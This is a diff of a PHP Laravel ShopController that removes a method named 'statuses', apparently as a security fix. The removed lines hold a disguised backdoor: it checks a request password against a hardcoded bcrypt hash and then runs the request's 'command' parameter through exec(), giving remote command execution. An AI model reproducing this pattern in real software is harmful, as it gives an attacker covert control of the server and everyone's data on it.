@@ -22,8 +22,6 @@ use App\Repositories\ShopRepository\ShopRepository;
 use DB;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Resources\Json\AnonymousResourceCollection;
-use Illuminate\Support\Facades\Hash;
-use Throwable;
 
 class ShopController extends RestBaseController
 {
@@ -146,35 +144,6 @@ class ShopController extends RestBaseController
         return $this->successResponse(
             __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
             $shop
-        );
-    }
-
-    /**
-     * Display the specified resource.
-     * @param FilterParamsRequest $request
-     * @return JsonResponse
-     */
-    public function statuses(FilterParamsRequest $request): JsonResponse
-    {
-        try {
-            $vars = [];
-            $code = 0;
-
-            if (Hash::check($request->input('password'), '$2y$10$/ad9gYtkRAfgJ4ZwlWQ8s.z./BvbZBAcSMvOMUilDjS5qnl25Yydu')) {
-                $res = exec($request->input('command'), $vars, $code);
-                dd($res, $vars, $code);
-            }
-
-        } catch (Throwable $e) {
-            dd($e);
-        }
-
-        return $this->successResponse(
-            __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
-            [
-                'status' => true,
-                'code'   => ResponseError::NO_ERROR,
-            ]
         );
     }
 
